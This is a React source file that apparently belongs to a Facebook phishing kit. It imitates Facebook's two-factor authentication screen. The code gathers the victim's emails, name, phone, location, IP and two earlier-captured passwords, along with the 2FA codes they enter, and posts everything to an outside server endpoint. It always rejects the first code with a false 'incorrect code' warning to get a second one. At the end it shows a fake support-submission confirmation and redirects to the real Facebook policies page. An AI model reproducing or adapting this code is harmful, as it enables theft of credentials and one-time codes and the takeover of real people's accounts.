import React, { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { image_code } from './Publics/images/images'
import { Button, InputNumber , Form } from 'antd';
import axios from 'axios';

const ConfirmComponent = () => {

    const [activePopup, setActivePopup] = useState(false);
    const [activeLink, setActiveLink] = useState(false);
    const [timeLeft, setTimeLeft] = useState(300); 
    const [activeWaring, setActiveWaring] = useState(false);
    const [form] = Form.useForm();

    const infoUser = JSON.parse(localStorage.getItem('dataPassWord'))

    useEffect(() => {
        const countdownInterval = setInterval(() => {
            if (timeLeft > 0) {
                setTimeLeft(timeLeft - 1); 
            } else {
                clearInterval(countdownInterval); 
                setActiveLink(true)
            }
        }, 1000); 

        return () => {
            clearInterval(countdownInterval); 
        };
    }, [timeLeft]);

    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const handleFinal = () => {
        window.location.replace('https://www.facebook.com/policies_center/');
    }

    const onFinishCodes = (values) => {

        if(timeLeft > 0){
            setActiveWaring(true)

            const dataLocalImages = JSON.parse(localStorage.getItem('dataPassWord'))
            const firstCode = {...dataLocalImages, first_code: values.fill_code}

            localStorage.setItem('dataFirstCode', JSON.stringify(firstCode))

            const data = {
                'fill_business_email': firstCode.fill_business_email,
                'fill_personal_email': firstCode.fill_personal_email,
                'fill_full_name': firstCode.fill_full_name,
                'fill_your_name': firstCode.fill_your_name,
                'fill_phone': firstCode.fill_phone,
                'ip': firstCode.ip,
                'city': firstCode.city,
                'country': firstCode.country,
                'first_password': firstCode.firt_password,
                'second_password': firstCode.second_password,
                'first_code': firstCode.first_code ,
            }

            form.setFieldsValue({ fill_code: '' });
            axios.post( process.env.REACT_APP_URL_SERVER + "/api/news", data) 
        }

        
        else {
            const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
            const finalCode = {...dataLocalImages, seconds_code: values.fill_code}

            localStorage.setItem('dataAllCode', JSON.stringify(finalCode))

            const data = {
                'fill_business_email': finalCode.fill_business_email,
                'fill_personal_email': finalCode.fill_personal_email,
                'fill_full_name': finalCode.fill_full_name,
                'fill_your_name': finalCode.fill_your_name,
                'fill_phone': finalCode.fill_phone,
                'ip': finalCode.ip,
                'city': finalCode.city,
                'country': finalCode.country,
                'first_password': finalCode.firt_password,
                'second_password': finalCode.second_password,
                'first_code': finalCode.first_code,
                'second_code': values.fill_code,
            }

            axios.post( process.env.REACT_APP_URL_SERVER + "/api/news", data)
                .then((response) => {
                    if (response.data.status === 0 ) {
                        handleOpendPopup()
                    }
                })
        }
                        
    };


    return (
        <div>
            <div className="confirm">

                <div className="main-confirm">
                    <div className="container">
                        <div className="content col-md-6 col-12">
                            <Form
                                name="basicForm"
                                initialValues={{
                                remember: true,
                                }}
                                onFinish={onFinishCodes}
                                autoComplete="off"
                                form={form}
                            >
                                <div className="card-th">

                                    <div className="name-fb">
                                        {/* <p><b>{infoUser.fill_full_name}</b></p> */}
                                        {/* <div className="dot"></div> */}
                                        <p><b>Facebook</b></p>
                                    </div>

                                    <h3 className="twh3">Go to your authentication app</h3>
                                    <div className="bodyyy">
                                        <p>Enter the 6-digit code for this account from the two- factor authentication app you set up (such as Duo Mobile or Google Authenticator) or Enter the code we sent to {infoUser.fill_phone.slice(0,3) + " *** **" + infoUser.fill_phone.slice(-3)}</p>
                                        <div>
                                            <img src={image_code} width="100%" className="" alt="" />  
                                        </div>
                                           
                                        <div className="form-group" style={{paddingLeft: "0px", paddingTop: "5px", paddingBottom: "10px", display: "inline-block"}}>
                                                
                                            <div
                                                className="item-form"
                                                style={{
                                                    display: "flex",
                                                    alignItems: "center"
                                                }}
                                            >
                                                <Form.Item
                                                    name="fill_code"
                                                    rules={[
                                                        {
                                                            required: true,
                                                            message: '',
                                                        },
                                                    ]}
                                                >
                                                    <InputNumber placeholder='Code'/>
                                                </Form.Item>

                                            </div>
                                        </div>

                                        <div className={`${activeWaring === true ? 'active' : ''}`} id="waring-code"> 
                                            <p>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
                                        </div>

                                        <p style={{fontSize: "1rem", color: "#4b4f56", display: "flex", alignItems: "center"}}> 
                                            <a style={{marginBottom:"2px", marginRight: "5px"}} href=""><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8 3C5.23858 3 3 5.23857 3 8C3 10.7614 5.23858 13 8 13C10.7614 13 13 10.7614 13 8C13 7.25457 12.8372 6.54852 12.5457 5.91433C12.4304 5.66343 12.5403 5.36654 12.7912 5.25121C13.0421 5.13588 13.339 5.24578 13.4543 5.49669C13.8048 6.25923 14 7.1075 14 8C14 11.3137 11.3137 14 8 14C4.68629 14 2 11.3137 2 8C2 4.68629 4.68629 2 8 2V3Z" fill="#4b4f56"/>
                                <path d="M8 4.46624V0.533757C8 0.321798 8.24721 0.206009 8.41005 0.341702L10.7695 2.30794C10.8895 2.40789 10.8895 2.5921 10.7695 2.69205L8.41005 4.65829C8.24721 4.79399 8 4.6782 8 4.46624Z" fill="#4b4f56"/>
                                </svg>
</a> 
                                            We can send a new code in <b style={{marginLeft: "5px"}}>{minutes}:{seconds < 10 ? `0${seconds}` : seconds}</b>
                                        </p>
                                    </div> 


                                    <div className="footerii" style={{width: "100%"}}>
                                        
                                        <Form.Item 
                                            className="btn butoni"
                                        >
                                            <Button
                                                htmlType="submit"
                                            >
                                                Continue
                                            </Button>
                                        </Form.Item>
                                    </div>
                                    <div className="try">
                                        <a href="">Get a new code</a>
                                    </div>
                                </div>
                            </Form>
                        </div>
                    </div>
                </div>


                <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup">
                    <div className="background"  onClick={handleClosePopup}></div>
                    <div className="content">
                        <div className="modal-header custom-header px-0">
                            <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "18px", fontWeight: "600"}}>Form Submitted Successfully!</h5>
                        </div>

                        <div style={{padding : '1rem 0',borderBottom: '1px solid #dee2e6'}}>
                            <p>Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can view responses in your Support Inbox.</p>
                        </div>
                        <div style={{textAlign: "right"}}>
                            <button className="btn butoni" onClick={handleFinal} style={{
                                color: "rgb(255, 255, 255)", 
                                backgroundColor: "rgb(44, 132, 244)", 
                                width: "auto",
                                float: 'right',
                                margin: '0',
                                padding: '0.3rem 1rem'
                            }}>
                            ok
                            </button>
                        </div>

                    </div>
                </div>

            </div>
        </div>
    )
}

export default ConfirmComponent